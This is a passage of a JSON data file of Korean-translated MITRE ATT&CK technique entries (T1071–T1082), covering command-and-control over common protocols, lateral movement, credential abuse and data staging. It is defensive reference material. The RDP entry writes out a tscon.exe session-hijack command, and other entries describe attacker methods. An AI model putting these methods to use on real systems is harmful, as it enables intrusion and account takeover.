      "description": "적대자는 OSI 애플리케이션 계층 프로토콜을 사용하여 통신함으로써 기존 트래픽과 혼합되어 탐지/네트워크 필터링을 피할 수 있습니다. 원격 시스템에 대한 명령과 종종 이러한 명령의 결과는 클라이언트와 서버 간의 프로토콜 트래픽 내에 포함됩니다.\n\n적대자는 웹 브라우징, 파일 전송, 전자 메일, DNS 또는 발행/구독에 사용되는 다양한 프로토콜을 활용할 수 있습니다. 내장 내에서 발생하는 연결(프록시 또는 피봇 노드와 다른 노드 간의 연결 등)에서는 일반적으로 사용되는 프로토콜로 SMB, SSH 또는 RDP가 있습니다. (출처: Mandiant APT29 Eye Spy Email Nov 22)",
      "external_id": "T1071",
      "modified": "2024-08-28T14:10:33.145Z",
      "title": "Application Layer Protocol",
      "translated": true
    },
    {
      "description": "적대자는 기존 트래픽과 혼합하여 탐지를 피하고 네트워크 필터링을 회피하기 위해 웹 트래픽과 관련된 애플리케이션 계층 프로토콜을 사용하여 통신할 수 있습니다. 원격 시스템에 대한 명령과 이러한 명령의 결과는 클라이언트와 서버 간의 프로토콜 트래픽에 내장됩니다.\n\nHTTP/S(출처: CrowdStrike Putter Panda) 및 WebSocket(출처: Brazking-Websockets)과 같은 웹 트래픽을 운반하는 프로토콜은 환경에서 매우 일반적일 수 있습니다. HTTP/S 패킷에는 데이터를 숨길 수 있는 많은 필드와 헤더가 있습니다. 적대자는 이러한 프로토콜을 악용하여 피해자의 네트워크 내에서 그들의 제어하에 있는 시스템과 통신하면서 정상적이고 기대되는 트래픽을 모방할 수 있습니다.",
      "external_id": "T1071.001",
      "modified": "2024-04-16T12:28:21.234Z",
      "title": "Web Protocols",
      "translated": true
    },
    {
      "description": "공격자는 파일 전송과 관련된 애플리케이션 계층 프로토콜을 사용하여 탐지 또는 네트워크 필터링을 피하고 기존 트래픽과 혼합하여 통신할 수 있습니다. 원격 시스템에 대한 명령과 종종 그 명령의 결과는 클라이언트와 서버 간의 프로토콜 트래픽 내에 내장됩니다.\n\nSMB(참조: US-CERT TA18-074A), FTP(참조: ESET Machete July 2019), FTPS 및 TFTP와 같은 파일 전송 프로토콜은 환경에서 매우 일반적일 수 있습니다. 이러한 프로토콜에서 생성된 패킷은 많은 필드와 헤더를 포함하고 있어 데이터가 숨겨질 수 있습니다. 데이터는 전송된 파일 내에서도 숨겨질 수 있습니다. 공격자는 이러한 프로토콜을 악용하여 피해자 네트워크 내 자신이 제어하는 시스템과 통신하면서도 정상적인, 예상되는 트래픽을 모방할 수 있습니다.",
      "external_id": "T1071.002",
      "modified": "2024-01-18T17:23:22.591Z",
      "title": "File Transfer Protocols",
      "translated": true
    },
    {
      "description": "위협 행위자는 기존 트래픽에 섞여 탐지를 피하거나 네트워크 필터링을 회피하기 위해 전자 메일 전송과 관련된 애플리케이션 계층 프로토콜을 사용하여 통신할 수 있습니다. 원격 시스템에 대한 명령과 종종 이러한 명령의 결과는 클라이언트와 서버 간의 프로토콜 트래픽에 포함됩니다.\n\nSMTP/S, POP3/S, IMAP과 같은 전자 메일을 전송하는 프로토콜은 환경에서 매우 일반적일 수 있습니다. 이러한 프로토콜에서 생성된 패킷은 데이터가 숨겨질 수 있는 많은 필드와 헤더를 포함할 수 있습니다. 데이터는 이메일 메시지 자체 내에서도 숨길 수 있습니다. 위협 행위자는 피해자 네트워크 내에서 자신의 통제 하에 있는 시스템과 통신하기 위해 이러한 프로토콜을 악용할 수 있으며, 정상적이고 예상되는 트래픽을 모방할 수 있습니다. (출처: FireEye APT28)",
      "external_id": "T1071.003",
      "modified": "2024-04-16T12:28:59.928Z",
      "title": "Mail Protocols",
      "translated": true
    },
    {
      "description": " 적대자는 탐지 및 네트워크 필터링을 피하기 위해 이미 존재하는 트래픽에 섞여 DNS(도메인 이름 시스템) 애플리케이션 레이어 프로토콜을 사용하여 통신할 수 있습니다. 원격 시스템에 대한 명령과 종종 이러한 명령의 결과는 클라이언트와 서버 간의 프로토콜 트래픽 내에 포함됩니다.\n\nDNS 프로토콜은 컴퓨터 네트워킹에서 관리 기능을 수행하므로 여러 환경에서 매우 일반적일 수 있습니다. DNS 트래픽은 네트워크 인증이 완료되기 전에도 허용될 수 있습니다. DNS 패킷은 데이터를 숨길 수 있는 많은 필드와 헤더를 포함하고 있습니다. 종종 DNS 터널링으로 알려진 이 방법을 통해 적대자는 자제해야 할 네트워크 내에서 자신의 제어 하에 있는 시스템과 통신하고 정상적인 예상 트래픽을 모방할 수 있습니다. (인용: PAN DNS 터널링) (인용: Medium DnsTunneling)",
      "external_id": "T1071.004",
      "modified": "2023-12-26T20:54:38.721Z",
      "title": "DNS",
      "translated": true
    },
    {
      "description": "적대자는 기존 트래픽에 섞여 탐지/네트워크 필터링을 피하기 위해 게시/구독(publish/subscribe, pub/sub) 애플리케이션 계층 프로토콜을 사용하여 통신할 수 있습니다. 원격 시스템에 대한 명령과 종종 해당 명령의 결과는 클라이언트와 서버 간의 프로토콜 트래픽에 포함됩니다.\n\n<code>MQTT</code>, <code>XMPP</code>, <code>AMQP</code>, <code>STOMP</code>와 같은 프로토콜은 게시/구독 설계를 사용하며, 메시지 배포는 중앙 집중식 브로커에 의해 관리됩니다. (인용: wailing crab sub/pub) (인용: Mandiant APT1 Appendix) 게시자는 메시지를 주제별로 분류하며, 구독자는 자신이 구독한 주제에 따라 메시지를 수신합니다. (인용: wailing crab sub/pub) 적대자는 게시/구독 프로토콜을 악용하여 메시지 브로커 뒤에서 자신이 제어하는 시스템과 통신하면서 정상적이고 예상되는 트래픽을 모방할 수 있습니다.",
      "external_id": "T1071.005",
      "modified": "2024-10-16T13:08:35.629Z",
      "title": "Publish/Subscribe Protocols",
      "translated": true
    },
    {
      "description": "침입자는 기업 내에 설치된 중앙 집권 소프트웨어 제품군에 접근하여 명령을 실행하고 네트워크를 가로질러 옆으로 이동할 수 있습니다. 구성 관리 및 소프트웨어 배포 애플리케이션은 기업 네트워크나 클라우드 환경에서 일상적인 관리 목적으로 사용될 수 있습니다. 이러한 시스템은 CI/CD 파이프라인에도 통합될 수 있습니다. 이와 같은 솔루션의 예로는 SCCM, HBSS, Altiris, AWS Systems Manager, Microsoft Intune, Azure Arc 및 GCP Deployment Manager가 있습니다.\n\n네트워크 전반 또는 기업 전반의 엔드포인트 관리 소프트웨어에 대한 접근은 침입자가 모든 연결된 시스템에서 원격 코드 실행을 수행할 수 있게 할 수 있습니다. 이러한 접근 권한은 다른 시스템으로의 횡적 이동, 정보 수집, 혹은 모든 엔드포인트의 하드 드라이브를 삭제하는 등의 특정 효과를 야기하는 데 사용될 수 있습니다.\n\nSaaS 기반 구성 관리 서비스는 클라우드 호스팅 인스턴스에 대해 광범위한 [클라우드 관리 명령](https://attack.mitre.org/techniques/T1651) 실행을 허용할 수 있으며, 온프레미스 엔드포인트에서 임의의 명령을 실행할 수도 있습니다. 예를 들어, Microsoft Configuration Manager는 Global 또는 Intune 관리자가 Entra ID에 가입된 온프레미스 장치에서 SYSTEM으로서 스크립트를 실행할 수 있게 허용합니다.(Citation: SpecterOps Azure에서 온프레미스 AD로의 측면 이동 2020) 이러한 서비스는 또한 [웹 프로토콜](https://attack.mitre.org/techniques/T1071/001)을 활용하여 침입자가 소유한 인프라로 통신할 수 있습니다.(Citation: Mitiga 보안 권고: 원격 접근 트로이 목마로서의 SSM 에이전트)\n\n네트워크 인프라 장치 또한 유사하게 침입자에게 악용될 수 있는 구성 관리 도구를 가질 수 있습니다.(Citation: Fortinet 제로데이 및 중국 해킹 그룹이 사용하는 맞춤형 맬웨어의 정찰 작전)\n\n이 작업에 필요한 권한은 시스템 구성에 따라 다르며, 특정 제3자 시스템에 직접 접근할 경우 로컬 자격 증명이 충분할 수도 있으며, 특정 도메인 자격 증명이 필요한 경우도 있을 수 있습니다. 그러나 시스템은 로그인을 하거나 특정 기능에 접근하기 위해 관리 계정을 요구할 수 있습니다.",
      "external_id": "T1072",
      "modified": "2024-09-25T20:49:37.227Z",
      "title": "Software Deployment Tools",
      "translated": true
    },
    {
      "description": "프로그램은 실행 시간에 로드되는 DLL을 지정할 수 있습니다. 프로그램이 필요한 DLL을 적절하게 명시하지 않거나 모호하게 지정할 경우 의도하지 않은 DLL이 로드되는 취약점에 노출될 수 있습니다. 사이드 로딩 취약점은 특히 Windows Side-by-Side (WinSxS) 매니페스트가 로드될 DLL의 특성에 대해 충분히 명확하지 않을 때 발생합니다. 공격자는 사이드 로딩에 취약한 합법적인 프로그램을 이용하여 악성 DLL을 로드할 수 있습니다. \n\n공격자는 합법적이고 신뢰할 수 있는 시스템 또는 소프트웨어 프로세스 하에서 자신이 수행하는 작업을 숨기기 위한 수단으로 이 기술을 사용할 가능성이 높습니다.",
      "external_id": "T1073",
      "modified": "2020-03-20T14:28:39.529Z",
      "title": "DLL Side-Loading",
      "translated": true
    },
    {
      "description": "적대자는 수집한 데이터를 유출하기 전에 중앙 위치나 디렉토리에 저장할 수 있습니다. 데이터는 별도의 파일로 보관되거나 [수집된 데이터 아카이브](https://attack.mitre.org/techniques/T1560)와 같은 기법을 통해 하나의 파일로 결합될 수 있습니다. 인터랙티브 명령 셸을 사용하고, [cmd](https://attack.mitre.org/software/S0106)와 bash 내의 일반적인 기능을 사용하여 데이터를 스테이징 위치로 복사할 수 있습니다. (인용: PWC Cloud Hopper 2017년 4월)\n\n클라우드 환경에서 적대자는 데이터 유출 전에 특정 인스턴스나 가상 머신 내에서 데이터를 스테이징할 수 있습니다. 적대자는 [클라우드 인스턴스 생성](https://attack.mitre.org/techniques/T1578/002)을 수행하고 해당 인스턴스에서 데이터를 스테이징할 수 있습니다. (인용: Mandiant M-Trends 2020)\n\n적대자는 탐지를 피하기 위해 C2 서버에 대한 연결 수를 최소화하려고 피해자 네트워크에서 중앙 위치로 데이터를 스테이징하기로 선택할 수 있습니다.",
      "external_id": "T1074",
      "modified": "2024-09-30T13:28:37.415Z",
      "title": "Data Staged",
      "translated": true
    },
    {
      "description": "적대자는 수집한 데이터를 유출(pre-exfiltration) 전에 로컬 시스템의 중앙 위치나 디렉토리에 정리할 수 있습니다. 데이터는 개별 파일로 보관하거나 [수집한 데이터 아카이브](https://attack.mitre.org/techniques/T1560)와 같은 기술을 통해 하나의 파일로 결합될 수 있습니다. 대화형 명령 셸을 사용할 수 있으며, [cmd](https://attack.mitre.org/software/S0106)와 bash의 일반적인 기능을 사용하여 데이터를 스테이징 위치로 복사할 수 있습니다.\n\n적대자는 또한 로컬 저장소 데이터베이스/저장소 또는 Windows 레지스트리와 같은 시스템의 다양한 형식/위치에 수집한 데이터를 스테이징할 수 있습니다. (출처: Prevailion DarkWatchman 2021)",
      "external_id": "T1074.001",
      "modified": "2024-08-26T16:28:39.920Z",
      "title": "Local Data Staging",
      "translated": true
    },
    {
      "description": "적대자는 탈취 전 여러 시스템에서 수집한 데이터를 중앙 위치 또는 하나의 시스템의 디렉토리에 배치할 수 있습니다. 데이터는 별도의 파일로 유지되거나 [수집된 데이터 아카이브](https://attack.mitre.org/techniques/T1560)와 같은 기법을 통해 하나의 파일로 결합될 수 있습니다. 인터랙티브 커맨드 셸이 사용될 수 있으며, [cmd](https://attack.mitre.org/software/S0106) 및 bash 내의 일반적인 기능을 이용하여 데이터를 스테이징 위치로 복사할 수 있습니다.\n\n클라우드 환경에서는 적대자가 탈취 전에 특정 인스턴스나 가상 머신 내에서 데이터를 스테이지할 수 있습니다. 적대자는 [클라우드 인스턴스 생성](https://attack.mitre.org/techniques/T1578/002)을 통해 데이터를 해당 인스턴스에 스테이지할 수 있습니다. (출처: Mandiant M-Trends 2020)\n\n탈취 전에 하나의 시스템에서 데이터를 스테이지함으로써, 적대자는 C2 서버에 연결되는 수를 최소화하고 탐지를 더욱 회피할 수 있습니다.",
      "external_id": "T1074.002",
      "modified": "2024-09-30T13:28:37.414Z",
      "title": "Remote Data Staging",
      "translated": true
    },
    {
      "description": "패스 더 해시(PtH)는 사용자의 평문 비밀번호에 접근하지 않고도 사용자로 인증하는 방법입니다. 이 방법은 평문 비밀번호를 요구하는 표준 인증 단계를 우회하여 비밀번호 해시를 사용하는 인증 단계로 직접 이동합니다. 이 기술에서는 사용되는 계정의 유효한 비밀번호 해시를 인증 자격 접근(Credential Access) 기법을 통해 캡처합니다. 캡처된 해시는 PtH를 사용하여 해당 사용자로 인증하는 데 사용됩니다. 인증된 후에는 PtH를 사용하여 로컬 또는 원격 시스템에서 작업을 수행할 수 있습니다.\n\nWindows 7 및 그 이상 버전의 시스템은 KB2871997에 따라 유효한 도메인 사용자 자격 증명 또는 RID 500 관리자 해시가 필요합니다. (출처: NSA Spotting)",
      "external_id": "T1075",
      "modified": "2020-01-30T19:55:38.699Z",
      "title": "Pass the Hash",
      "translated": true
    },
    {
      "description": "원격 데스크톱은 운영 체제의 일반적인 기능으로, 사용자가 원격 시스템의 데스크톱 그래픽 사용자 인터페이스에 상호 작용 세션으로 로그인할 수 있게 해줍니다. Microsoft는 원격 데스크톱 프로토콜(RDP)의 구현을 원격 데스크톱 서비스(RDS)라고 부릅니다. (출처: TechNet 원격 데스크톱 서비스) RDS와 유사한 그래픽 액세스를 제공하는 다른 구현 및 타사 도구도 있습니다.\n\n적대자는 RDP/RDS를 통해 원격 시스템에 연결하여 서비스가 활성화되고 알려진 자격 증명이 있는 계정에 대한 액세스를 허용하는 경우 액세스를 확대할 수 있습니다. 적대자는 RDP와 함께 사용할 자격 증명을 얻기 위해 자격 증명 접근 기법(Credential Access techniques)을 사용할 가능성이 높습니다. 적대자는 또한 지속성을 위해 RDP를 접근성 기능(Accessibility Features) 기법과 함께 사용할 수 있습니다. (출처: Alperovitch Malware)\n\n적대자는 또한 합법적인 사용자의 원격 세션을 탈취하는 RDP 세션 하이재킹을 수행할 수 있습니다. 일반적으로 다른 사람이 자신의 세션을 탈취하려고 할 때 사용자에게 알림이 표시되고 질문이 제기됩니다. 시스템 권한을 사용하여 터미널 서비스 콘솔(Terminal Services Console)에서 <code>c:\\windows\\system32\\tscon.exe [탈취할 세션 번호]</code>를 사용하면, 적대자는 자격 증명이나 사용자에게 프롬프트 없이 세션을 탈취할 수 있습니다. (출처: RDP 하이재킹 Korznikov) 이는 원격 또는 로컬에서, 활성 세션이나 연결 해제된 세션 모두에서 수행될 수 있습니다. (출처: RDP 하이재킹 Medium) 이는 도메인 관리자(Domain Admin) 또는 더 높은 권한의 계정 세션을 탈취함으로써 원격 시스템 탐색(Remote System Discovery) 및 권한 상승(Privilege Escalation)으로 이어질 수 있습니다. 모든 작업은 기본 Windows 명령을 사용하여 수행할 수 있지만, RedSnarf에서 기능으로 추가되기도 했습니다. (출처: Kali Redsnarf)",
      "external_id": "T1076",
      "modified": "2020-02-11T18:24:04.507Z",
      "title": "Remote Desktop Protocol",
      "translated": true
    },
    {
      "description": "Windows 시스템에는 관리자만 접근할 수 있는 숨겨진 네트워크 공유가 있으며, 이는 원격 파일 복사 및 기타 관리 기능을 수행할 수 있는 능력을 제공합니다. 예시 네트워크 공유에는 <code>C$</code>, <code>ADMIN$</code>, <code>IPC$</code>가 포함됩니다.\n\n적대자는 이 기술을 관리자 수준의 [유효한 계정](https://attack.mitre.org/techniques/T1078)과 함께 사용하여 서버 메시지 블록(SMB)를 통해 네트워크에 연결된 시스템에 원격으로 접근할 수 있습니다(Citation: Wikipedia SMB). 이를 통해 원격 프로시저 호출(RPC)을 사용하여 시스템과 상호작용하고(Citation: TechNet RPC), 파일을 전송하며, 전송된 이진 파일을 원격 실행을 통해 실행할 수 있습니다. SMB/RPC를 통한 인증 세션에 의존하는 실행 기술의 예로는 [예약된 작업/작업](https://attack.mitre.org/techniques/T1053), [서비스 실행](https://attack.mitre.org/techniques/T1035), [Windows 관리 도구](https://attack.mitre.org/techniques/T1047)가 있습니다. 적대자는 또한 NTLM 해시를 사용하여 [해시 전송](https://attack.mitre.org/techniques/T1075)이 가능하고 특정 구성 및 패치 수준을 가진 시스템의 관리자 공유에 접근할 수 있습니다(Citation: Microsoft Admin Shares).\n\n[Net](https://attack.mitre.org/software/S0039) 유틸리티는 유효한 자격증명을 사용하여 원격 시스템의 Windows 관리자 공유에 연결하기 위해 <code>net use</code> 명령을 사용할 수 있습니다(Citation: Technet Net Use).",
      "external_id": "T1077",
      "modified": "2020-03-23T19:54:12.651Z",
      "title": "Windows Admin Shares",
      "translated": true
    },
    {
      "description": "적대자는 초기 접근, 지속성, 권한 상승 또는 방어 회피의 수단으로 기존 계정의 자격 증명을 획득하고 악용할 수 있습니다. 손상된 자격 증명은 네트워크 내 시스템의 다양한 자원에 설정된 접근 제어를 우회하는 데 사용될 수 있으며, VPN, Outlook 웹 액세스, 네트워크 장치 및 원격 데스크톱과 같은 원격 시스템 및 외부 서비스에 대한 지속적인 접근을 위해 사용될 수도 있습니다. 손상된 자격 증명은 특정 시스템에 대한 권한 증가 또는 네트워크의 제한된 영역에 대한 접근을 허용할 수도 있습니다. 적대자는 자격 증명으로 제공된 합법적인 접근과 함께 악성코드나 도구를 사용하지 않기로 선택하여 그들의 존재를 탐지하기 어렵게 만들 수 있습니다.\n\n일부 경우에는 적대자가 비활성 계정을 악용할 수 있습니다. 예를 들어, 더 이상 조직의 일원이 아닌 개인의 계정이 그것입니다. 이러한 계정을 사용하면 적대자가 탐지를 피해갈 수 있으며, 원래 계정 사용자가 그들의 계정에서 발생하는 비정상적인 활동을 식별할 수 없기 때문에 더욱 그렇습니다.\n\n로컬, 도메인 및 클라우드 계정의 권한 겹침은 우려스러운 사항입니다. 이는 적대자가 계정과 시스템을 통해 전환하여 높은 수준의 접근(예: 도메인 또는 기업 관리자)에 도달하여 기업 내 설정된 접근 제어를 우회할 수 있게 할 수 있기 때문입니다.",
      "external_id": "T1078",
      "modified": "2024-10-15T16:09:46.024Z",
      "title": "Valid Accounts",
      "translated": true
    },
    {
      "description": "적대자는 기본 계정의 자격 증명을 획득하고 악용하여 초기 접근, 지속성, 권한 상승 또는 방어 회피 수단으로 사용할 수 있습니다. 기본 계정은 Windows 시스템의 게스트 계정이나 관리자 계정과 같이 운영 체제에 내장된 계정을 말합니다. 기본 계정에는 AWS의 루트 사용자 계정이나 Kubernetes의 기본 서비스 계정 등 다른 유형의 시스템, 소프트웨어 또는 장치의 공장 설정/제공자 설정 계정도 포함됩니다.(출처: Microsoft Local Accounts Feb 2019)(출처: AWS Root User)(출처: Threat Matrix for Kubernetes)\n\n기본 계정은 클라이언트 머신에 국한되지 않고, 네트워크 장치 및 컴퓨터 애플리케이션과 같은 장비용으로 미리 설정된 계정도 포함됩니다. 이는 내부, 오픈 소스 또는 상용 소프트웨어에 해당합니다. 사용자 이름과 비밀번호 조합이 미리 설정된 장비는 설치 후 변경하지 않을 경우 조직에 심각한 위협을 초래할 수 있으며, 이는 적대자의 쉬운 표적이 됩니다. 비슷하게, 적대자는 공개적으로 공개되었거나 도난당한 [개인 키](https://attack.mitre.org/techniques/T1552/004) 또는 자격 증명 자료를 활용하여 [원격 서비스](https://attack.mitre.org/techniques/T1021)를 통해 원격 환경에 합법적으로 연결할 수 있습니다.(출처: Metasploit SSH Module)",
      "external_id": "T1078.001",
      "modified": "2024-10-14T22:11:30.271Z",
      "title": "Default Accounts",
      "translated": true
    },
    {
      "description": "적대자는 초기 접근, 지속성, 권한 상승 또는 방어 회피 수단으로 도메인 계정의 자격 증명을 획득하고 남용할 수 있습니다. (출처: TechNet Credential Theft) 도메인 계정은 Active Directory 도메인 서비스에 의해 관리되며, 해당 도메인의 일부인 시스템 및 서비스에 대해 액세스와 권한이 구성됩니다. 도메인 계정은 사용자, 관리자 및 서비스 등을 포함할 수 있습니다. (출처: Microsoft AD Accounts)\n\n적대자는 다양한 방법을 통해 도메인 계정을 탈취할 수 있으며, 이 중 일부는 높은 수준의 권한을 가진 계정으로, [OS 자격 증명 덤프](https://attack.mitre.org/techniques/T1003)나 암호 재사용 등을 통해 도메인의 특권 자원에 대한 접근을 허용합니다.",
      "external_id": "T1078.002",
      "modified": "2023-08-14T14:55:07.432Z",
      "title": "Domain Accounts",
      "translated": true
    },
    {
      "description": "위협 주체는 초기 접근, 지속성, 권한 상승 또는 방어 회피 수단으로 로컬 계정의 자격 증명을 획득하고 악용할 수 있습니다. 로컬 계정은 조직이 사용자, 원격 지원, 서비스 또는 단일 시스템이나 서비스의 관리용으로 구성한 계정을 말합니다.\n\n로컬 계정은 또한 [OS 자격 증명 덤핑](https://attack.mitre.org/techniques/T1003)을 통해 권한을 상승시키고 자격 증명을 수집하는 데 악용될 수 있습니다. 비밀번호 재사용은 권한 상승 및 측면 이동을 목적으로 네트워크의 여러 기기에서 로컬 계정이 악용되는 것을 허용할 수 있습니다.",
      "external_id": "T1078.003",
      "modified": "2024-10-15T16:36:36.681Z",
      "title": "Local Accounts",
      "translated": true
    },
    {
      "description": "클라우드 환경에서 유효한 계정은 상대방이 초기 접근, 지속성, 권한 상승 또는 방어 회피를 달성하기 위해 행동을 수행할 수 있게 합니다. 클라우드 계정은 조직이 사용자, 원격 지원, 서비스 또는 클라우드 서비스 제공자 또는 SaaS 애플리케이션 내 자원 관리에 사용하기 위해 생성하고 구성한 계정을 말합니다. 클라우드 계정은 클라우드 내에서만 존재할 수 있으며, 또는 온프레미스 시스템과 클라우드 간의 동기화 또는 Windows Active Directory와 같은 다른 신원 소스와의 연합을 통해 하이브리드 방식으로 연결될 수도 있습니다(출처: AWS 아이덴티티 연합)(출처: Google GC 연합)(출처: Microsoft AD 연합 배포).\n\n서비스 또는 사용자 계정은 상대방에 의해 [무차별 대입 공격](https://attack.mitre.org/techniques/T1110), [피싱 공격](https://attack.mitre.org/techniques/T1566) 또는 다양한 다른 방법을 통해 환경에 접근하기 위해 목표가 될 수 있습니다. 연합되거나 동기화된 계정은 상대방이 온프레미스 시스템과 클라우드 환경 모두에 영향을 미칠 수 있는 경로가 될 수 있으며, 예를 들어 공유 자격 증명을 활용하여 [원격 서비스](https://attack.mitre.org/techniques/T1021)에 로그인할 수 있습니다. 고급 권한을 가진 클라우드 계정은 연합계정, 동기화된 계정 또는 클라우드 전용 계정에 관계없이 SaaS 기반의 [소프트웨어 배포 도구](https://attack.mitre.org/techniques/T1072)를 활용하여 하이브리드 연결된 장치에서 명령을 실행함으로써 온프레미스 환경으로 이동할 수도 있습니다.\n\n상대방은 손상된 클라우드 계정에서 지속성을 유지하기 위해 지속적인 [추가 클라우드 자격 증명](https://attack.mitre.org/techniques/T1098/001)을 생성할 수 있습니다. 이러한 자격 증명은 다단계 인증과 같은 보안 통제를 우회하는 데에도 사용될 수 있습니다.\n\n클라우드 계정은 환경 내에서 다양한 방법을 통해 [임시 승격된 클라우드 액세스](https://attack.mitre.org/techniques/T1548/005) 또는 기타 권한을 가질 수 있습니다. 역할 할당 또는 역할 수임 정책의 잘못된 구성은 상대방이 이러한 메커니즘을 사용하여 계정의 의도된 범위를 초과한 권한을 이용할 수 있도록 할 수 있습니다. 이러한 권한이 과도한 계정은 [클라우드 API](https://attack.mitre.org/techniques/T1059/009) 또는 기타 방법을 통해 온라인 저장 계정 및 데이터베이스에서 민감한 데이터를 수집하는 데 사용될 수 있습니다.",
      "external_id": "T1078.004",
      "modified": "2024-10-14T22:11:30.271Z",
      "title": "Cloud Accounts",
      "translated": true
    },
    {
      "description": "적대자는 여러 겹의 암호화를 사용하여 C2(명령 및 제어) 통신을 수행하며, 일반적으로(그러나 반드시 그렇지는 않음) HTTPS 또는 SMTPS와 같은 프로토콜 암호화 방식 내에 맞춤형 암호화 방식의 터널링을 사용합니다.",
      "external_id": "T1079",
      "modified": "2020-03-24T14:09:11.589Z",
      "title": "Multilayer Encryption",
      "translated": true
    },
    {
      "description": "침입자는 네트워크 드라이브나 내부 코드 저장소와 같은 공유 스토리지 위치에 콘텐츠를 추가하여 원격 시스템에 페이로드를 배포할 수 있습니다. 네트워크 드라이브나 다른 공유 장소에 저장된 콘텐츠는 원래 유효한 파일에 악성 프로그램, 스크립트 또는 익스플로잇 코드를 추가하여 오염될 수 있습니다. 사용자가 공유된 오염된 콘텐츠를 열면, 악성 부분이 실행되어 침입자의 코드가 원격 시스템에서 실행됩니다. 침입자는 오염된 공유 콘텐츠를 사용하여 수평 이동(lateral movement)을 할 수 있습니다.\n\n디렉터리 공유 피벗은 사용자가 공유 네트워크 디렉터리에 접근할 때 멀웨어를 전파하기 위해 여러 다른 기법을 사용하는 이 기술의 변형입니다. 이는 디렉토리 .LNK 파일의 [바로가기 수정(Shortcut Modification)](https://attack.mitre.org/techniques/T1547/009)과 [변장(Masquerading)](https://attack.mitre.org/techniques/T1036)을 사용하여 실제 디렉터리처럼 보이게 하며, 이는 [숨겨진 파일 및 디렉터리(Hidden Files and Directories)](https://attack.mitre.org/techniques/T1564/001)로 숨겨집니다. 악성 .LNK 기반 디렉터리에는 디렉터리 내의 숨겨진 멀웨어 파일을 실행한 후 사용자가 예상하는 작업이 여전히 수행될 수 있도록 실제로 의도된 디렉터리를 여는 내장 명령이 포함되어 있습니다. 자주 사용되는 네트워크 디렉터리와 함께 사용될 경우, 이 기술은 빈번한 재감염과 시스템에 대한 광범위한 접근은 물론 새로운 고급 권한 계정에 대한 접근으로 이어질 수 있습니다. (출처: Retwin Directory Share Pivot)\n\n침입자는 또한 건강한 바이너리의 코드 앞뒤에 악성 코드를 추가하여 공유 네트워크 디렉터리를 통해 바이너리 감염을 통해 타협할 수 있습니다. 멀웨어는 건강한 바이너리의 원래 진입점(OEP)을 수정하여 합법적인 코드보다 먼저 실행되도록 할 수 있습니다. 감염된 파일이 원격 시스템에 의해 실행될 때 감염은 계속 전파될 수 있습니다. 이러한 감염은 .EXE, .DLL, .SCR, .BAT 및/또는 .VBS를 포함한 확장자로 끝나는 바이너리 및 비 바이너리 형식을 목표로 할 수 있습니다.",
      "external_id": "T1080",
      "modified": "2024-10-15T16:07:36.903Z",
      "title": "Taint Shared Content",
      "translated": true
    },
    {
      "description": "공격자는 비밀번호가 포함된 파일을 찾기 위해 로컬 파일 시스템과 원격 파일 공유를 검색할 수 있습니다. 이러한 파일은 사용자가 자신의 자격 증명을 저장하기 위해 만든 파일, 개인의 그룹을 위한 공유 자격 증명 저장소, 시스템이나 서비스의 비밀번호가 포함된 구성 파일 또는 내장된 비밀번호가 있는 소스 코드/바이너리 파일일 수 있습니다.\n\n[OS 자격 증명 덤핑](https://attack.mitre.org/techniques/T1003)을 통해 백업이나 저장된 가상 머신에서 비밀번호를 추출할 수 있습니다. (인용: CG 2014) 비밀번호는 또한 Windows 도메인 컨트롤러에 저장된 그룹 정책 기본 설정에서 얻을 수 있습니다. (인용: SRD GPP)\n\n클라우드 환경에서는 인증된 사용자 자격 증명이 로컬 구성 및 자격 증명 파일에 저장되는 경우가 많습니다. 경우에 따라 이러한 파일은 다른 머신으로 복사 및 재사용할 수 있으며, 파일을 복사할 필요 없이 내용을 읽고 인증에 사용할 수도 있습니다. (인용: Specter Ops - 클라우드 자격 증명 저장소)",
      "external_id": "T1081",
      "modified": "2021-03-08T10:33:00.910Z",
      "title": "Credentials in Files",
      "translated": true
    },
    {
      "description": "적대자는 운영 체제 및 하드웨어에 대한 상세 정보를 얻으려고 시도할 수 있으며, 여기에는 버전, 패치, 핫픽스, 서비스 팩 및 아키텍처가 포함됩니다. 적대자는 [시스템 정보 검색(System Information Discovery)](https://attack.mitre.org/techniques/T1082)에서 얻은 정보를 자동화된 검색을 통해 활용하여, 이후 행동을 결정할 수 있습니다. 예를 들어, 적대자가 대상 시스템을 완전히 감염시킬지 여부나 특정 행동을 시도할지 등을 결정하는 데 사용됩니다.\n\n[Systeminfo](https://attack.mitre.org/software/S0096)와 같은 도구를 사용하여 상세한 시스템 정보를 수집할 수 있습니다. 권한이 있는 접근으로 실행할 경우, macOS의 <code>systemsetup</code> 구성 도구를 통해 시스템 데이터에 대한 세부 정보를 수집할 수 있습니다. 예를 들어, 사용자 수준의 접근 권한을 가진 적대자는 <code>df -aH</code> 명령어를 실행하여 현재 마운트된 디스크와 관련된 자유 공간을 확인할 수 있습니다. 적대자는 또한 네트워크 장치에서 [네트워크 장치 CLI(Network Device CLI)](https://attack.mitre.org/techniques/T1059/008)를 활용하여 상세한 시스템 정보를 수집할 수 있습니다 (예: <code>show version</code>).(인용: US-CERT-TA18-106A) [시스템 정보 검색(System Information Discovery)](https://attack.mitre.org/techniques/T1082)과 기타 검색 및 정찰을 통해 수집된 정보는 페이로드 개발 및 은폐를 촉진할 수 있습니다. (인용: OSX.FairyTale)(인용: 20 macOS 일반 도구 및 기법)\n\nIaaS(서비스로서의 인프라) 클라우드 제공업체인 AWS, GCP 및 Azure는 API를 통해 인스턴스 및 가상 머신 정보를 접근할 수 있습니다. 성공적인 인증 API 호출은 특정 인스턴스의 운영 체제 플랫폼 및 상태 또는 가상 머신의 모델 뷰와 같은 데이터를 반환할 수 있습니다. (인용: Amazon Describe Instance)(인용: Google Instances Resource)(인용: Microsoft Virtual Machine API)",
      "external_id": "T1082",
      "modified": "2024-10-15T16:42:22.247Z",
      "title": "System Information Discovery",
      "translated": true
    },
    {
